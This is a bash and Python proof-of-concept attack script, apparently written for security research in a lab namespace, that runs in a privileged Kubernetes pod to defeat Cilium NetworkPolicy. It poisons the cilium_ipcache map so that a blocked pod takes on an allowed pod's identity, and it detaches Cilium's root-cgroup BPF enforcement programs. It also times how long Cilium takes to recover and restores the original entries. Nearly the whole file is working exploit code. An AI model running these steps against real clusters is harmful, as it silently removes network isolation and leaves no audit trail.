#!/bin/bash
# Cilium BPF State Tampering — Attack Script
#
# Runs INSIDE the privileged attack-pod. Tests two attack vectors:
#   1. ipcache SecurityIdentity poisoning  (make blocked pod look like allowed pod)
#   2. Cilium cgroup program detachment    (remove enforcement from root cgroup)
#
# Usage:
#   kubectl cp poc/cilium_attack.sh cilium-research/attack-pod:/attack/cilium_attack.sh
#   kubectl exec -it -n cilium-research attack-pod -- bash /attack/cilium_attack.sh \
#       <target_ip> <blocked_ip> <allowed_ip>
#
# Get IPs from:
#   TARGET_IP  — kubectl get pod policy-target  -n cilium-research -o jsonpath='{.status.podIP}'
#   BLOCKED_IP — kubectl get pod blocked-source -n cilium-research -o jsonpath='{.status.podIP}'
#   ALLOWED_IP — kubectl get pod allowed-source -n cilium-research -o jsonpath='{.status.podIP}'

set -uo pipefail

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

atk()     { echo -e "${RED}[ATTACK ]${NC} $*"; }
inf()     { echo -e "${YELLOW}[INFO   ]${NC} $*"; }
ok()      { echo -e "         ${BOLD}[+]${NC} $*"; }
fail()    { echo -e "${RED}[-]${NC} $*"; }
sep()     { echo -e "${DIM}──────────────────────────────────────────────────────${NC}"; }
section() { echo -e "\n${BOLD}$*${NC}"; sep; }

TARGET_IP="${1:?Usage: $0 <target_ip> <blocked_ip> <allowed_ip>}"
BLOCKED_IP="${2:?}"
ALLOWED_IP="${3:?}"

# ── Phase 0: prerequisites ────────────────────────────────────────────────────
section "Phase 0: Install prerequisites"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq 2>/dev/null
apt-get install -y -qq python3 curl iproute2 \
    2>&1 | grep -E "^(Unpacking|Setting up|E:)" || true

# bpftool resolution order:
#   1. Cilium ships a static bpftool at /usr/local/bin/bpftool — always use it
#      if present (matches the kernel Cilium was compiled against, works in VM)
#   2. Real binary under /usr/lib/linux-tools/<kernel-version>/bpftool
#   3. PATH (may be the Ubuntu wrapper script — functional only when the
#      matching linux-tools-<version> package is installed, which it won't
#      be on a minikube VM kernel)
BPFTOOL=$(  ls /usr/local/bin/bpftool 2>/dev/null \
         || ls /usr/lib/linux-tools/*/bpftool 2>/dev/null | sort -V | tail -1 \
         || command -v bpftool 2>/dev/null \
         || true)

# Verify the resolved bpftool actually works (wrapper silently fails on
# minikube because linux-tools-<vm-kernel> is not packaged)
if [ -n "$BPFTOOL" ]; then
    $BPFTOOL version >/dev/null 2>&1 || BPFTOOL=""
fi

if [ -z "$BPFTOOL" ]; then
    fail "bpftool not found or not functional."
    fail "Copy Cilium's static binary from the cilium-agent pod first (on the HOST):"
    fail "  CPOD=\$(kubectl get pods -n kube-system -l k8s-app=cilium -o jsonpath='{.items[0].metadata.name}')"
    fail "  kubectl cp kube-system/\${CPOD}:/usr/local/bin/bpftool /tmp/bpftool-cilium"
    fail "  kubectl cp /tmp/bpftool-cilium cilium-research/attack-pod:/usr/local/bin/bpftool"
    exit 1
fi
ok "bpftool: $BPFTOOL  ($(${BPFTOOL} version 2>&1 | head -1))"
ok "python3: $(python3 --version 2>&1)"

# Store bpftool path for Python sub-scripts
echo "$BPFTOOL" > /tmp/_bpftool_path
echo "$TARGET_IP $BLOCKED_IP $ALLOWED_IP" > /tmp/_research_ips

# ── Phase 1: Discovery ────────────────────────────────────────────────────────
section "Phase 1: Discover Cilium BPF state"

inf "All BPF maps on this node (first 60 lines):"
$BPFTOOL map show 2>&1 | head -60 || true
echo ""

inf "bpffs contents:"
find /sys/fs/bpf -maxdepth 3 2>/dev/null | head -40 || true
echo ""

# Locate cilium_ipcache — check all known Cilium pin paths
IPCACHE_PATH=""
for p in /sys/fs/bpf/tc/globals/cilium_ipcache \
          /sys/fs/bpf/cilium/maps/cilium_ipcache \
          /sys/fs/bpf/cilium_globals/cilium_ipcache; do
    [ -e "$p" ] && { IPCACHE_PATH="$p"; break; }
done
# Also try a glob search under bpffs
if [ -z "$IPCACHE_PATH" ]; then
    IPCACHE_PATH=$(find /sys/fs/bpf -name "cilium_ipcache" 2>/dev/null | head -1 || true)
fi

if [ -n "$IPCACHE_PATH" ]; then
    IPCACHE_ID=$($BPFTOOL map show pinned "$IPCACHE_PATH" -j 2>/dev/null \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])" 2>/dev/null || true)
    ok "cilium_ipcache pinned at $IPCACHE_PATH  id=$IPCACHE_ID"
else
    IPCACHE_ID=$($BPFTOOL map show -j 2>/dev/null | python3 -c "
import sys, json
for m in json.load(sys.stdin):
    if 'cilium_ipcache' in m.get('name',''):
        print(m['id']); break
" 2>/dev/null || true)
    [ -n "$IPCACHE_ID" ] && ok "cilium_ipcache found by name  id=$IPCACHE_ID" || \
        { fail "cilium_ipcache not found — is this a Cilium node?"; }
fi

echo "$IPCACHE_ID" > /tmp/_ipcache_id

inf "Cilium programs attached to root cgroup (/sys/fs/cgroup):"
$BPFTOOL cgroup show /sys/fs/cgroup 2>/dev/null || true
echo ""
sep

# ── Phase 2: Baseline ─────────────────────────────────────────────────────────
section "Phase 2: Baseline — confirm NetworkPolicy is enforced"
echo -n "  attack-pod → policy-target ($TARGET_IP): "
if curl -s --max-time 3 "http://$TARGET_IP" -o /dev/null 2>/dev/null; then
    echo -e "${RED}ALLOWED${NC} (attack-pod is in same namespace — unexpected)"
else
    echo -e "${GREEN}BLOCKED${NC} ✓  (NetworkPolicy enforced)"
fi
echo ""
inf "To verify from blocked-source (run on the HOST in another terminal):"
echo -e "  ${BOLD}kubectl exec -n cilium-research blocked-source -- curl -s --max-time 3 http://$TARGET_IP${NC}"
sep

# ── Phase 3: ipcache SecurityIdentity poisoning ───────────────────────────────
section "Phase 3: ipcache SecurityIdentity Poisoning"
atk "Goal: change BLOCKED pod's identity → make Cilium treat it as ALLOWED source"
echo ""

[ -z "$IPCACHE_ID" ] && {
    inf "Skipping — cilium_ipcache map not found"
} || {

export BPFTOOL IPCACHE_ID BLOCKED_IP ALLOWED_IP TARGET_IP

python3 << 'PYEOF'
import subprocess, sys, struct, socket, os, re

BPFTOOL   = open('/tmp/_bpftool_path').read().strip()
IPCACHE_ID = os.environ['IPCACHE_ID']
BLOCKED   = os.environ['BLOCKED_IP']
ALLOWED   = os.environ['ALLOWED_IP']

YELLOW = '\033[1;33m'
RED    = '\033[1;31m'
GREEN  = '\033[1;32m'
BOLD   = '\033[1m'
DIM    = '\033[2m'
NC     = '\033[0m'

def run(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return r.stdout, r.stderr, r.returncode

def inet_hex(ip):
    """IPv4 string → 8-char hex in network byte order, e.g. '0a000005'"""
    return socket.inet_aton(ip).hex()

# ── dump raw hex from bpftool ────────────────────────────────────────────────
def dump_raw(map_id):
    out, _, rc = run(f"{BPFTOOL} map dump id {map_id} 2>/dev/null")
    if rc != 0 or not out.strip():
        # try pinned path
        out, _, rc = run(f"{BPFTOOL} map dump pinned /sys/fs/bpf/tc/globals/cilium_ipcache 2>/dev/null")
    return out

def parse_entries(raw):
    """
    Parse bpftool raw hex output:
      key: HH HH ...
      value: HH HH ...
    Returns list of (key_bytes, val_bytes).
    """
    entries = []
    blocks  = re.split(r'\bkey:\s*', raw)[1:]   # split on "key:"
    for block in blocks:
        parts = re.split(r'\bvalue:\s*', block, maxsplit=1)
        if len(parts) != 2:
            continue
        k_hex = re.sub(r'\s+', ' ', parts[0].strip().split('\n')[0]).strip()
        v_hex = re.sub(r'\s+', ' ', parts[1].strip().split('\n')[0]).strip()
        try:
            key_b = bytes(int(x, 16) for x in k_hex.split() if x)
            val_b = bytes(int(x, 16) for x in v_hex.split() if x)
            entries.append((key_b, val_b))
        except ValueError:
            pass
    return entries

print(f"{YELLOW}[INFO   ]{NC} Dumping cilium_ipcache (map id={IPCACHE_ID})...")
raw = dump_raw(IPCACHE_ID)
entries = parse_entries(raw)
print(f"{YELLOW}[INFO   ]{NC}   Total entries parsed: {len(entries)}")

if not entries:
    print(f"{RED}[-]{NC} Could not parse ipcache — showing raw dump:")
    print(raw[:2000])
    sys.exit(0)

# ── find entries for our IPs ─────────────────────────────────────────────────
blocked_hex = inet_hex(BLOCKED)   # 4-byte IP as 8 hex chars, network order
allowed_hex = inet_hex(ALLOWED)

blocked_entry = None
allowed_entry = None

for key_b, val_b in entries:
    key_hex = key_b.hex()
    if blocked_hex in key_hex:
        blocked_entry = (key_b, val_b)
    if allowed_hex in key_hex:
        allowed_entry = (key_b, val_b)

print(f"{RED}[ATTACK ]{NC} blocked-source ({BLOCKED}) found in ipcache: {blocked_entry is not None}")
print(f"{GREEN}[+      ]{NC} allowed-source ({ALLOWED}) found in ipcache: {allowed_entry is not None}")

if not blocked_entry or not allowed_entry:
    print(f"\n{YELLOW}[INFO   ]{NC} IP lookup failed — showing all ipcache keys for inspection:")
    for kb, vb in entries[:10]:
        print(f"  key_hex={kb.hex()}  val_hex={vb.hex()}")
    print(f"\n  Looking for: blocked={blocked_hex}  allowed={allowed_hex}")
    # Still show map exists and Cilium state is readable
    print(f"\n{YELLOW}[INFO   ]{NC} cilium_ipcache is readable from inside the container.")
    print(f"          This confirms BPF map namespace isolation is absent.")
    sys.exit(0)

# ── extract sec_label (first 4 bytes of value, LE u32) ──────────────────────
def sec_label(val_b):
    if len(val_b) < 4:
        return None
    return struct.unpack('<I', val_b[:4])[0]

blocked_id = sec_label(blocked_entry[1])
allowed_id  = sec_label(allowed_entry[1])

print(f"\n{BOLD}ipcache identity lookup:{NC}")
print(f"  {RED}{BLOCKED}{NC}  (blocked-source)  SecurityIdentity = {RED}{blocked_id}{NC}")
print(f"  {GREEN}{ALLOWED}{NC}  (allowed-source)  SecurityIdentity = {GREEN}{allowed_id}{NC}")

if blocked_id == allowed_id:
    print(f"\n{YELLOW}[INFO   ]{NC} Identities already match — no poisoning needed.")
    sys.exit(0)

# ── save original for restore ────────────────────────────────────────────────
k_hex_str   = ' '.join(f'{b:02x}' for b in blocked_entry[0])
old_val_str = ' '.join(f'{b:02x}' for b in blocked_entry[1])
with open('/tmp/cilium_ipcache_restore', 'w') as f:
    f.write(f"{IPCACHE_ID}|{k_hex_str}|{old_val_str}")

# ── build poisoned value ─────────────────────────────────────────────────────
new_val = bytearray(blocked_entry[1])
new_val[0] = allowed_id & 0xFF
new_val[1] = (allowed_id >> 8) & 0xFF
new_val[2] = (allowed_id >> 16) & 0xFF
new_val[3] = (allowed_id >> 24) & 0xFF
new_val_str = ' '.join(f'{b:02x}' for b in new_val)

print(f"\n{RED}[ATTACK ]{NC} Poisoning ipcache entry:")
print(f"  key:     {k_hex_str}")
print(f"  old val: {old_val_str}  (sec_label={blocked_id})")
print(f"  new val: {new_val_str}  (sec_label={allowed_id}  ← allowed-source identity)")

cmd = f"{BPFTOOL} map update id {IPCACHE_ID} key hex {k_hex_str} value hex {new_val_str}"
out, err, rc = run(cmd)
if rc == 0:
    print(f"\n{RED}{BOLD}[ATTACK ] IPCACHE POISONED{NC}")
    print(f"  {BLOCKED} now claims identity={allowed_id}")
    print(f"  Cilium datapath will evaluate NetworkPolicy as if this is 'allowed-source'")
    open('/tmp/cilium_poison_active', 'w').write('1')
    print(f"\n{YELLOW}[INFO   ]{NC} Now test from blocked-source on the HOST:")
    print(f"  kubectl exec -n cilium-research blocked-source -- curl -s --max-time 5 http://{os.environ['TARGET_IP']}")
    print(f"  (Expected: HTML from nginx — NetworkPolicy bypassed)")
else:
    print(f"\n{RED}[-]{NC} Update failed (rc={rc}): {err}")
    print(f"    cmd: {cmd}")
    print(f"    Note: CAP_NET_ADMIN may be required for BPF_MAP_UPDATE_ELEM on this kernel.")
PYEOF

}  # end IPCACHE_ID check

sep

# ── Phase 4: Monitor ipcache recovery ─────────────────────────────────────────
if [ -f /tmp/cilium_poison_active ] && [ -n "$IPCACHE_ID" ]; then
    section "Phase 4: Monitor — how fast does cilium-agent correct the ipcache?"
    inf "Polling ipcache every 2 s for up to 120 s..."
    echo ""

    RESTORE_DATA=$(cat /tmp/cilium_ipcache_restore 2>/dev/null || true)
    ORIG_VAL=$(echo "$RESTORE_DATA" | cut -d'|' -f3)
    KEY_HEX=$(echo "$RESTORE_DATA" | cut -d'|' -f2)

    POISON_START=$(date +%s%3N)
    RECOVERED=0

    for i in $(seq 1 60); do
        sleep 2
        CURRENT_VAL=$($BPFTOOL map lookup id "$IPCACHE_ID" \
            key hex $KEY_HEX 2>/dev/null | \
            grep -oP 'value: \K.*' | head -1 | tr -d ' ' || echo "?")

        NOW=$(date +%s%3N)
        ELAPSED=$(( NOW - POISON_START ))

        if [ "$CURRENT_VAL" = "$(echo "$ORIG_VAL" | tr -d ' ')" ] || \
           [[ "$(echo "$ORIG_VAL" | tr -d ' ')" == *"$CURRENT_VAL"* ]]; then
            echo -e "  ${GREEN}[+]${NC} $(date '+%H:%M:%S')  identity RESTORED (elapsed: ${ELAPSED} ms)"
            echo "$ELAPSED" > /tmp/cilium_ipcache_recovery_ms
            RECOVERED=1
            break
        else
            echo -e "  ${RED}[!]${NC} $(date '+%H:%M:%S')  identity still poisoned  (${ELAPSED} ms elapsed)"
        fi
    done

    if [ "$RECOVERED" -eq 0 ]; then
        NOW=$(date +%s%3N)
        ELAPSED=$(( NOW - POISON_START ))
        echo ""
        echo -e "  ${RED}[!!]${NC} cilium-agent did NOT correct the poisoning within ${ELAPSED} ms"
        echo -e "       ${BOLD}This is the vulnerability window.${NC}"
        echo "-1" > /tmp/cilium_ipcache_recovery_ms
    fi

    # Restore regardless
    section "Phase 4b: Restore original ipcache entry"
    python3 -c "
import subprocess, sys
data = open('/tmp/cilium_ipcache_restore').read().strip().split('|')
if len(data) != 3: sys.exit(0)
map_id, key_hex, orig_val = data
bt = open('/tmp/_bpftool_path').read().strip()
cmd = f'{bt} map update id {map_id} key hex {key_hex} value hex {orig_val}'
r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
if r.returncode == 0:
    print('\033[1;32m[+]\033[0m ipcache entry restored to original value')
else:
    print(f'\033[1;31m[-]\033[0m Restore failed: {r.stderr.strip()}')
"
    rm -f /tmp/cilium_poison_active
fi
sep

# ── Phase 5: Cilium BPF program detachment ────────────────────────────────────
section "Phase 5: Detach Cilium cgroup enforcement programs"
atk "Removing Cilium's BPF enforcement from root cgroup"
echo ""

# Collect all cgroup programs that look like Cilium's (egress/ingress at root)
$BPFTOOL cgroup show /sys/fs/cgroup -j 2>/dev/null | python3 -c "
import sys, json, os

YELLOW = '\033[1;33m'
RED    = '\033[1;31m'
NC     = '\033[0m'

try:
    progs = json.load(sys.stdin)
except:
    print(f'{YELLOW}[INFO   ]{NC} No programs at root cgroup or JSON parse failed')
    sys.exit(0)

if not progs:
    print(f'{YELLOW}[INFO   ]{NC} No cgroup programs at /sys/fs/cgroup (may be attached deeper)')
    sys.exit(0)

print(f'{YELLOW}[INFO   ]{NC} Programs at root cgroup:')
for p in progs:
    pid   = p.get('id','?')
    atype = p.get('attach_type','?')
    name  = p.get('name','')
    flags = p.get('attach_flags','')
    print(f'  id={pid}  type={atype}  name={name}  flags={flags}')

# Write candidate list for bash to consume
with open('/tmp/cilium_cgroup_progs', 'w') as f:
    for p in progs:
        f.write(f\"{p.get('id','')}:{p.get('attach_type','')}\n\")
" 2>/dev/null || true

echo ""

if [ ! -f /tmp/cilium_cgroup_progs ]; then
    inf "Scanning full cgroup tree for Cilium programs..."
    $BPFTOOL cgroup tree /sys/fs/cgroup 2>/dev/null | head -40 || true
    inf "Detachment test skipped — no programs found at root cgroup."
    inf "Cilium may use per-endpoint tc/xdp programs rather than root-cgroup hooks."
    inf "See: cilium endpoint list on the Cilium agent node."
else
    rm -f /tmp/cilium_detached_list
    while IFS=: read PROG_ID ATTACH_TYPE; do
        [ -z "$PROG_ID" ] && continue
        atk "Detaching prog id=$PROG_ID attach_type=$ATTACH_TYPE ..."
        if $BPFTOOL cgroup detach /sys/fs/cgroup "$ATTACH_TYPE" id "$PROG_ID" 2>/dev/null; then
            echo -e "  ${RED}[+] DETACHED id=$PROG_ID ($ATTACH_TYPE) — enforcement gap open${NC}"
            echo "$PROG_ID:$ATTACH_TYPE" >> /tmp/cilium_detached_list
        else
            echo -e "  ${YELLOW}[-] Could not detach id=$PROG_ID — may require specific flags${NC}"
        fi
    done < /tmp/cilium_cgroup_progs

    echo ""
    if [ -f /tmp/cilium_detached_list ]; then
        atk "$(wc -l < /tmp/cilium_detached_list) program(s) detached from root cgroup."
        inf "All pods on this node lose Cilium NetworkPolicy enforcement."
        inf "Test bypass (run on HOST):"
        echo -e "  ${BOLD}kubectl exec -n cilium-research blocked-source -- curl -s --max-time 5 http://$TARGET_IP${NC}"
        echo ""

        # ── Phase 5b: Monitor recovery ────────────────────────────────────────
        section "Phase 5b: Monitor — how fast does Cilium re-attach?"
        DETACH_START=$(date +%s%3N)
        REATTACH_COUNT=$(wc -l < /tmp/cilium_detached_list)
        RECOVERED=0

        for i in $(seq 1 30); do
            sleep 2
            CURRENT_PROGS=$($BPFTOOL cgroup show /sys/fs/cgroup -j 2>/dev/null | \
                python3 -c "import sys,json; data=json.load(sys.stdin); print(' '.join(str(p.get('id')) for p in data))" 2>/dev/null || echo "")

            FOUND=0
            while IFS=: read PROG_ID _; do
                echo "$CURRENT_PROGS" | grep -qw "$PROG_ID" && FOUND=$((FOUND+1)) || true
            done < /tmp/cilium_detached_list

            NOW=$(date +%s%3N)
            ELAPSED=$(( NOW - DETACH_START ))

            if [ "$FOUND" -ge "$REATTACH_COUNT" ]; then
                echo -e "  ${GREEN}[+]${NC} $(date '+%H:%M:%S')  all programs re-attached (${ELAPSED} ms)"
                echo "$ELAPSED" > /tmp/cilium_detach_recovery_ms
                RECOVERED=1
                break
            else
                echo -e "  ${RED}[!]${NC} $(date '+%H:%M:%S')  $FOUND/$REATTACH_COUNT programs back  (${ELAPSED} ms elapsed)"
            fi
        done

        if [ "$RECOVERED" -eq 0 ]; then
            NOW=$(date +%s%3N)
            ELAPSED=$(( NOW - DETACH_START ))
            echo ""
            echo -e "  ${RED}[!!]${NC} Cilium did NOT re-attach within ${ELAPSED} ms"
            echo "-1" > /tmp/cilium_detach_recovery_ms
        fi
    fi
fi
sep

# ── Phase 6: Summary ──────────────────────────────────────────────────────────
section "Phase 6: Research Summary"
echo ""
echo -e "${BOLD}Attack vector 1: ipcache SecurityIdentity Poisoning${NC}"
if [ -f /tmp/cilium_ipcache_recovery_ms ]; then
    REC_MS=$(cat /tmp/cilium_ipcache_recovery_ms)
    if [ "$REC_MS" = "-1" ]; then
        echo -e "  ${RED}Map write: SUCCESS  |  Cilium recovery: NOT OBSERVED within 120 s${NC}"
    else
        echo -e "  ${RED}Map write: SUCCESS  |  Cilium recovery: ${REC_MS} ms${NC}"
    fi
    echo "  Root cause: cilium_ipcache is a shared BPF map, accessible from any"
    echo "  privileged container via BPF_MAP_UPDATE_ELEM. No write-protect mechanism."
    echo "  NetworkPolicy bypass window = cilium-agent reconciliation interval."
elif [ -n "$IPCACHE_ID" ]; then
    echo "  Map found (id=$IPCACHE_ID), identity values read."
    echo "  Write attempt was made — check output above for result."
else
    echo "  cilium_ipcache not found on this node."
fi
echo ""

echo -e "${BOLD}Attack vector 2: Cgroup BPF Program Detachment${NC}"
if [ -f /tmp/cilium_detach_recovery_ms ]; then
    REC_MS=$(cat /tmp/cilium_detach_recovery_ms)
    if [ "$REC_MS" = "-1" ]; then
        echo -e "  ${RED}Detachment: SUCCESS  |  Cilium recovery: NOT OBSERVED within 60 s${NC}"
    else
        echo -e "  ${RED}Detachment: SUCCESS  |  Cilium recovery: ${REC_MS} ms${NC}"
    fi
    echo "  Root cause: BPF_PROG_DETACH is callable from any process with CAP_NET_ADMIN"
    echo "  (granted implicitly to privileged containers). Cilium has no watchdog"
    echo "  that continuously verifies its cgroup attachment is intact."
elif [ -f /tmp/cilium_detached_list ]; then
    echo "  Programs detached — check output above for details."
else
    echo "  No root-cgroup programs found. Cilium may use per-endpoint tc/xdp instead."
    echo "  Alternative: detach per-endpoint XDP programs via 'ip link set dev <veth> xdp off'"
fi
echo ""

echo -e "${BOLD}Key observation:${NC}"
echo "  Both attacks require a privileged pod (hostPath bpffs + CAP_NET_ADMIN)."
echo "  This is NOT a normal workload profile, but it IS grantable in Kubernetes"
echo "  via PodSecurityPolicy (deprecated) or any custom admission webhook that"
echo "  allows hostPath volumes + securityContext.privileged=true."
echo ""
echo "  The gap: Cilium assumes its BPF state is authoritative and immutable."
echo "  No integrity verification runs continuously in the datapath."
echo "  An attacker with the above privileges can modify policy enforcement"
echo "  silently, with no audit trail in Cilium's logs."
echo ""
echo -e "${DIM}Cleanup: kubectl delete namespace cilium-research${NC}"
